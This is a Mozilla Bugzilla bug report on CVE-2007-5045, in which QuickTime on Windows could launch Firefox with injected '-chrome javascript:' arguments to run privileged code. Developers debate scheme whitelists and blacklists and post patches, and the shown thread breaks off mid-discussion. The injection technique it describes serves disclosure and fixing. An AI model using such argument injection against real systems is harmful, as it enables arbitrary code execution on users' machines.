=== Content from bugzilla.mozilla.org_5e57842c_20250124_175409.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/395942)
* [XML](/show_bug.cgi?ctype=xml&id=395942)

Closed
[Bug 395942](/show_bug.cgi?id=395942)
(CVE-2007-5045)

Opened 17 years ago
Closed 17 years ago

# QuickTime flaw allows launching default browser with arbitrary parameters on Windows ("quicktime pwns firefox")

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

QuickTime flaw allows launching default browser with arbitrary parameters on Windows ("quicktime pwns firefox")

## Categories

### (Core :: General, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=General#General)

General
▾

Core :: General
For bugs in Core which do not fit into other more specific Core components
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=General&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=General&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=General)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Webcompat Score | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: Gavin, Assigned: dveditz)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=40)  [dveditz](/user_profile?user_id=1689)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/08de945228403cb0598d5906e2407a7d?d=mm&size=40)  [Gavin](/user_profile?user_id=103593)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/819fa8210bf0480993fed2d597565a52?d=mm&size=40)  [plawless](/user_profile?user_id=628136)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

47 people

## References

### ( [URL](http://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/ "http://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[412434](/show_bug.cgi?id=412434 "RESOLVED FIXED - opening a window with -chrome does not work anymore")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=395942&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=395942)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[395978](/show_bug.cgi?id=395978 "VERIFIED DUPLICATE - Security problem with quicktime : execution of malicious code"), [395989](/show_bug.cgi?id=395989 "VERIFIED DUPLICATE - Mozilla crash, possible OS crash"), [395991](/show_bug.cgi?id=395991 "VERIFIED DUPLICATE - Quicktime to hack into Firefox")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[gnucitizen.org/projects/0day-quicktim...](http://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/ "http://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (4 keywords, Whiteboard: [sg:critical] mitigation for QT Windows flaw. QT popup crash now bug 396228)

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2007-5045

[Keywords:](/describekeywords.cgi)

[fixed-seamonkey1.1.5](/buglist.cgi?keywords=fixed-seamonkey1.1.5&resolution=---),
[fixed1.8.0.15](/buglist.cgi?keywords=fixed1.8.0.15&resolution=---),
[verified1.8.1.7](/buglist.cgi?keywords=verified1.8.1.7&resolution=---),
[verified1.8.1.8](/buglist.cgi?keywords=verified1.8.1.8&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[sg:critical] mitigation for QT Windows flaw. QT popup crash now bug 396228

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [beltzner](/user_profile?user_id=137548) | [blocking1.9](#a176482_137548 "17 years ago") | + |
| --- | --- | --- |
| [beltzner](/user_profile?user_id=137548) | blocking1.9 | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [blocking1.8.1.7](#a98930_1689 "17 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | blocking1.8.1.7 | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [blocking1.8.1.8](#a98957_1689 "17 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | blocking1.8.1.8 | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [wanted1.8.1.x](#a98930_1689 "17 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | wanted1.8.1.x | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files, 3 obsolete files)

| [testcase](/attachment.cgi?id=280638)  [17 years ago](#c1)  [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)   218 bytes, video/quicktime |  | [Details](/attachment.cgi?id=280638&action=edit) |
| --- | --- | --- |
| [potential patch (1.8 branch)](/attachment.cgi?id=280697)  [17 years ago](#c20)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   6.54 KB, patch |  | [Details](/attachment.cgi?id=280697&action=edit) | [Diff](/attachment.cgi?id=280697&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280697) |
| [1.8 branch patch v2](/attachment.cgi?id=280849)  [17 years ago](#c24)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   5.24 KB, patch | Gavin : [review-](#c30 "17 years ago") | [Details](/attachment.cgi?id=280849&action=edit) | [Diff](/attachment.cgi?id=280849&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280849) |
| [trunk version](/attachment.cgi?id=280857)  [17 years ago](#c26)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   12.23 KB, patch | Gavin : [review+](#c31 "17 years ago")  mscott : [review+](#c53 "17 years ago")  neil : [review+](#c27 "17 years ago") | [Details](/attachment.cgi?id=280857&action=edit) | [Diff](/attachment.cgi?id=280857&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280857) |
| [1.8 branch patch v3](/attachment.cgi?id=280914)  [17 years ago](#c32)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   6.06 KB, patch |  | [Details](/attachment.cgi?id=280914&action=edit) | [Diff](/attachment.cgi?id=280914&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280914) |
| [1.8 branch patch v4 (use nsIJARURI)](/attachment.cgi?id=280917)  [17 years ago](#c35)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   8.51 KB, patch | Gavin : [review+](#a178705_103593 "17 years ago")  dveditz : [approval1.8.1.7+](#c36 "17 years ago")  dveditz : [approval1.8.1.8+](#c36 "17 years ago")  asac : [approval1.8.0.next+](#c0 "17 years ago") | [Details](/attachment.cgi?id=280917&action=edit) | [Diff](/attachment.cgi?id=280917&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280917) |
| [XPFE patch](/attachment.cgi?id=280995)  [17 years ago](#c39)  [neil@parkwaycc.co.uk](/user_profile?user_id=14006)   1.73 KB, patch | jag+mozilla : [review+](#a282291_29582 "17 years ago")  dveditz : [superreview+](#c48 "17 years ago")  dveditz : [approval1.8.1.7+](#c48 "17 years ago")  dveditz : [approval1.8.1.8+](#c48 "17 years ago")  asac : [approval1.8.0.next+](#c0 "17 years ago") | [Details](/attachment.cgi?id=280995&action=edit) | [Diff](/attachment.cgi?id=280995&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280995) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=395942#c0)• 17 years ago |
|  | |

This was reported at the URL in the URL field. QuickTime seems to have a flaw that allows specially crafted files handled by the plugin to launch the default browser with arbitrary parameters. The examples on that site use the QuickTime flaw to launch Firefox with "-chrome javascript:<code>" to execute arbitrary code, assuming your default browser is Firefox.
The fix for [bug 384384](/show_bug.cgi?id=384384 "RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability") would protect us in this case if QuickTime used the correct system APIs to launch the default browser, but they appear to read the .html file association from the registry and launch the browser directly.
The QuickTime plugin should be fixed to a) not allow launching the default browser with arbitrary parameters and b) use the right API to launch the default browser (it's not really clear to me why it needs to do that anyways), but perhaps we can "fix" this particular case from our end.
A cross-platform testcase is available at:
<http://people.mozilla.com/~gavin/bug/qt/test.mov>
It alerts "Vulnerable" if privileged code was allowed to run.

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=395942#c1)• 17 years ago |
|  | |

Attached video
[testcase](attachment.cgi?id=280638)
— [Details](attachment.cgi?id=280638&action=edit)

|  | [Mike Beltzner [:beltzner, not reading bugmail]](/user_profile?user_id=137548) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=395942#c2)• 17 years ago |
|  | |

Testcase returns "Server not found" page for me in a new tab on Minefield OSX, saying "Firefox can't find the server at www.-chrome%20javascript.com." so this might be Linux/Windows only.
Hooray for 3% of our user base!

|  | [Mike Beltzner [:beltzner, not reading bugmail]](/user_profile?user_id=137548) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a579_137548)• 17 years ago |

Flags: wanted1.8.1.x?Flags: blocking1.9?

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=395942#c3)• 17 years ago |
|  | |

Yeah, it looks like Mac is not affected, and there's no QuickTime plugin for Mac (other plugins that play QuickTime files are unlikely to have the exact same flaw as the official QuickTime plugin on Windows), so this looks to be a Windows-only problem.
My testing was done on Windows with 7.2 and a trunk build, but this appears to affect any recent version of the QuickTime plugin (there's a comment on the blog about 2.0.0.6/QT5.6 not being vulnerable).OS: All → Windows XPHardware: All → PC

|  | [logan](/user_profile?user_id=33984) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=395942#c4)• 17 years ago |
|  | |

I don't know about VLC or xine, but mplayer (all-20061022) doesn't seem to know what to do with this.OS: Windows XP → AllHardware: PC → All

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=395942#c5)• 17 years ago |
|  | |

(In reply to [comment #3](/show_bug.cgi?id=395942#c3 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> and there's no QuickTime plugin for Mac
I meant Linux, of course.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=395942#c6)• 17 years ago |
|  | |

note: they read the .html file association, and then ignore the actual registered command-line template they find (which includes "-osint") in favor of pulling out the executable and then simply appending the "qtnext" value without any of the other specified options.
QuickTime itself is where the bug lies, it does not have to be run as a plugin. If you've got a downloaded local file you get the same effect as long as Firefox is the registered .html (or .htm) handler.
QuickTime ought to be using ShellExecute() instead to get the default browser. If they are paranoid about launching a non-browser (as well they should be) they should vet the scheme against a whitelist of good schemes ([http:/https](http:///https):, maybe ftp:).
Mitigation: uninstall QuickTime. Disabling javascript does not help since chrome ignores that setting.
Protection on our end: drop support for the -chrome argument (adding an enabling pref for use by projects built on our platform, the intended use for -chrome). Regardless of the preceeding, use a whitelist of schemes with the -chrome argument, possibly including only chrome: and resource:.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a3476_1689)• 17 years ago |

Assignee: nobody → dveditz

|  | [Giorgio Maone [:ma1]](/user_profile?user_id=151994) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=395942#c7)• 17 years ago |
|  | |

Would it be feasible to completely disable command line parsing, except for one single URL parameter maybe whitelisted on /^(https?|file|ftp):/, in the executable registered as the system-wide "default browser" or in similarly "public" roles, and provide a private command line interface enabled wrapper/alias (e.g. firefox-cli) for compatibility with legacy applications (if any), which would accept the whole story?

|  | [Brendan Eich [:brendan]](/user_profile?user_id=1214) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=395942#c8)• 17 years ago |
|  | |

Cc'ing Eric in case he can help on the QT side. We have our own side to deal with so this is not a case where one fix on only one "side" suffices.
/be

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=395942#c9)• 17 years ago |
|  | |

I'm afraid that removing the -chrome argument entirely is going a bit too far... We're trying to mitigate an issue in another system level app here, so to avoid breaking things unnecessarily I think we should limit ourselves to preventing the specific type of attack that we're seeing. I can understand wanting to be extra sure that no variants are exposed once we've shipped a fix, but whitelisting the protocols that -chrome supports and thereby preventing command-line injection of code seems like it will fix the problem without impacting users of the current flag that rely on being able to point to code that's already on disk (resource:, chrome:, file:, etc). Just doing that would have also fixed [bug 384384](/show_bug.cgi?id=384384 "RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability"), right?

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=395942#c10)• 17 years ago |
|  | |

(In reply to [comment #8](/show_bug.cgi?id=395942#c8 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> We have our own side to deal with so this is not a case where one fix on only
> one "side" suffices.
I'm don't see what on our side would need to be fixed, if QuickTime didn't have this flaw. We can reduce the odds of other broken apps being exploited to use us to execute code by treating any and all command line input as potentially malicious, sure, but I think that's also going too far. I think we should add the minimum number of restrictions on command line input that we need to protect our users, and without bugs in other apps that allow tunneling arbitrary parameters to Firefox, that minimum would be 0.

|  | [Brendan Eich [:brendan]](/user_profile?user_id=1214) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=395942#c11)• 17 years ago |
|  | |

(In reply to [comment #10](/show_bug.cgi?id=395942#c10 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> (In reply to [comment #8](/show_bug.cgi?id=395942#c8 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> > We have our own side to deal with so this is not a case where one fix on only
> > one "side" suffices.
>
> I'm don't see what on our side would need to be fixed, if QuickTime didn't have
> this flaw. We can reduce the odds of other broken apps being exploited to use
> us to execute code by treating any and all command line input as potentially
> malicious, sure, but I think that's also going too far. I think we should add
> the minimum number of restrictions on command line input that we need to
> protect our users, and without bugs in other apps that allow tunneling
> arbitrary parameters to Firefox, that minimum would be 0.
Meanwhile, back in reality, defense in depth is required, sometimes to a degree that compromises a single app's notion of command line utility.
/be

|  | [Dan Mosedale (:dmosedale, :dmose)](/user_profile?user_id=1537) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=395942#c12)• 17 years ago |
|  | |

Giorgio's suggestion in [comment 7](/show_bug.cgi?id=395942#c7 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")") sounds like a good one to me. In some ways, it's like a DIY version of what bz and others have suggested that OS vendors should do: provide separate registration for "sandboxed" and "unsandboxed" handlers.

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=395942#c13)• 17 years ago |
|  | |

(In reply to [comment #11](/show_bug.cgi?id=395942#c11 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> Meanwhile, back in reality, defense in depth is required, sometimes to a degree
> that compromises a single app's notion of command line utility.
Defense in depth doesn't mean "rip out features indiscriminately"; you know that. There isn't only one solution to this problem, and you shouldn't dismiss my argument because I'm suggesting we should be careful before going too far.

|  | [Giorgio Maone [:ma1]](/user_profile?user_id=151994) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=395942#c14)• 17 years ago |
|  | |

(In reply to [comment #10](/show_bug.cgi?id=395942#c10 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> We can reduce the odds of other broken apps being exploited to use
> us to execute code by treating any and all command line input as potentially
> malicious, sure, but I think that's also going too far. I think we should add
> the minimum number of restrictions on command line input that we need to
> protect our users, and without bugs in other apps that allow tunneling
> arbitrary parameters to Firefox, that minimum would be 0.
I agree with trying not to break things -- hey, it's NoScript's mission
breaking stuff which Firefox was not brave enough to break ;)
So, what I was trying to say is that there are hooks registered at system level
or otherwise "public" interfaces to be used for inter-process communication
which already assume (more or less explicitly) that we're talking with "a
browser" which accepts only one parameter, i.e. an URL to open.
Exposing the whole set of command line options to these interfaces means
expanding the attack surface with no real advantage: those options won't be
used for any legitimate use, since they're not cross-browser.
So an alternate proposal to my rather radical "firefox" VS "firefox-cli" could
be "firefoxw" VS "firefox", much like "javaw" VS "java": a strict 1 argument
wrapper for public browser hooks, and the normal cli legacy-compatible
executable.

|  | [Brendan Eich [:brendan]](/user_profile?user_id=1214) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=395942#c15)• 17 years ago |
|  | |

Gavin: where did I write that we should rip out -chrome? Where did I dismiss your argument for whitelisting?
What I objected to in [comment 10](/show_bug.cgi?id=395942#c10 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")") was utopian statements of the form "without bugs in other apps that allow tunneling arbitrary parameters to Firefox, that minimum would be 0." Sorry if I was unclear.
/be

|  | [:Gavin Sharp [email: gavin@gavinsharp.com]](/user_profile?user_id=103593)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=395942#c16)• 17 years ago |
|  | |

(In reply to [comment #15](/show_bug.cgi?id=395942#c15 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")"))
> Gavin: where did I write that we should rip out -chrome? Where did I dismiss
> your argument for whitelisting?
Apologies, my fault for misinterpreting your comment and reacting defensively.
> What I objected to in [comment 10](/show_bug.cgi?id=395942#c10 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")") was utopian statements of the form "without
> bugs in other apps that allow tunneling arbitrary parameters to Firefox, that
> minimum would be 0." Sorry if I was unclear.
I don't deny that it's utopian, but I do think it's true. You said "this is not a case where one fix on only one "side" suffices", and I just wanted to make it clear that were QuickTime able to somehow fix all deployed QuickTime plugins, that fix alone would suffice. Obviously that's not possible, so it wasn't a useful distinction to make, in retrospect.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=395942#c20)• 17 years ago |
|  | |

Attached patch

[potential patch (1.8 branch)](attachment.cgi?id=280697&action=diff) (obsolete)
— [Details](attachment.cgi?id=280697&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280697)

Here's one potential patch for Firefox and Thunderbird (we can fix seamonkey the same way on trunk, but will require a different branch patch). This restricts -chrome to chrome: and resource: uris but does not kill the feature outright. People who want to do so can set the new prefs to false. Apps that install additional protocol schemes can add additional prefs if appropriate, and developers who insist on using file: can add that.
We should not support file: for general release because of UNC paths (and obviously not network protocols like http:)
Could have put the whitelisted schemes in a single string pref for compactness but then addons who need to alter it will fight over who sets it last.
This stops the published exploits but does not prevent QuickTime Media-link files from launching actual installed chrome resources. If any of those do bad stuff based on passed arguments then a hole remains. I'm mainly worried about addon chrome since our own chrome should already be avoiding this dangerous practice.
This also does not prevent QuickTime Media-links from calling other arbitrary command-line arguments. <http://mxr.mozilla.org/mozilla/search?string=handleflag>
We'll need to fix at least -install-global-extension/-theme somehow.
[Attachment #280697](/attachment.cgi?id=280697&action=edit "potential patch (1.8 branch)") -
Flags: review?(gavin.sharp)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=395942#c21)• 17 years ago |
|  | |

[Comment 7](/show_bug.cgi?id=395942#c7 "VERIFIED FIXED - QuickTime flaw allows launching default browser with arbitrary parameters on Windows (\"quicktime pwns firefox\")") absolutely sounds like the way to go for me. Whatever is registered as the default browser should have stringent vetting of input. The "basic" binary need not do that, however.
Note that the attached patch, as it stands, will break at least the Txul test and the chrome mochitests. The latter are trunk-only, but the former will send branch orange.

|  | [Biju](/user_profile?user_id=80752) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=395942#c22)• 17 years ago |
|  | |

My camara make .mov file so I cant uninstall QuickTime.
So even though we cant stop this exploit being used when QuickTime running as standalone app.
To avoid being vulnerable when we surf using Firefox, or using Thunderbird
we can disable "QuickTime Plug-in"
at menu Tools > Add-ons > Plugins
I also SeaMonkey for testing (even though Firefox is my default browser)
How do I disable "QuickTime Plug-in" in SeaMonkey?

|  | [Reed Loden [:reed]](/user_profile?user_id=159758) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a98840_159758)• 17 years ago |

Flags: blocking1.8.1.7?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a98930_1689)• 17 years ago |

Flags: wanted1.8.1.x?Flags: wanted1.8.1.x+Flags: blocking1.8.1.7?Flags: blocking1.8.1.7+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=395942#a98957_1689)• 17 years ago |

Flags: blocking1.8.1.8+

|  | [neil@parkwaycc.co.uk](/user_profile?user_id=14006) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=395942#c23)• 17 years ago |
|  | |

A possible alternative would be to do a URIChainHasFlags check for the URI\_INHERITS\_SECURITY\_CONTEXT flag; this should block all unsafe schemes.
Alternatively, CheckLoadURI with DISALLOW\_INHERIT\_PRINCIPAL | ALLOW\_CHROME ?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=395942#c24)• 17 years ago |
|  | |

Attached patch

[1.8 branch patch v2](attachment.cgi?id=280849&action=diff) (obsolete)
— [Details](attachment.cgi?id=280849&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280849)

turns out we don't want to block remote "-chrome http:" params, they don't run as privileged code and that feature forms the kernel for web-hosted desktop apps. Need to drop the pref approach and instead just kill the schemes that cause problems -- javascript: and data:
URIChainHasFlags doesn't exist on the 1.8 branch, so we can't use that approach. Would like to use it for the trunk patch though.
Could use checkLoadURI() and the DISALLOW\_SCRIPT\_OR\_DATA flag, but for the branch checking schemes is simpler and avoids a few problems (no handy unprivileged principal, crashes if we end up blocking one I don't have time to debug right now).
The toolkit patch prevents the -install-global-extension/-install-global-theme parameters from being able to install files from remote UNC paths.
The other command-line options Firefox supports are not abusable in the same way. -jsconsole and -new-window could be annoying, for instances, but not dangerous.
-inspector if DOMI is installed looks OK, the URL loaded has no privileges, even javascript: and data:
The JSSH test server if installed could be dangerous, but that's by design and people shouldn't have that installed.
Chatzilla vets arguments to the -chat param. If irc: urls are dangerous then that's a problem from any web page and not just through this QuickTime problem.
[Attachment #280697](/attachment.cgi?id=280697&action=edit "potential patch (1.8 branch)") -
Attachment is obsolete: true
[Attachment #280849](/attachment.cgi?id=280849&action=edit "1.8 branch patch v2") -
Flags: review?(gavin.sharp)
[Attachment #280697](/attachment.cgi?id=280697&action=edit "potential patch (1.8 branch)") -
Flags: review?(gavin.sharp)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=395942#c25)• 17 years ago |
|  | |

Comment on [attachment 280849](/attachment.cgi?id=280849 "1.8 branch patch v2") [[details]](/attachment.cgi?id=280849&action=edit "1.8 branch patch v2") [[diff]](/attachment.cgi?id=280849&action=diff "1.8 branch patch v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280849)
1.8 branch patch v2
>+ // check URI scheme against whitelist
I'll fix that comment in the mail handler when I check in, obviously it's a blacklist now. I'll use the wording from the browser handler.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=395942#c26)• 17 years ago |
|  | |

Attached patch

[trunk version](attachment.cgi?id=280857&action=diff)
— [Details](attachment.cgi?id=280857&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=395942&attachment=280857)

[Attachment #280857](/attachment.cgi?id=280857&action=edit "trunk version") -
Flags: review?(gavin.sharp)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)  Assignee |  |
| --- | --- | --- |
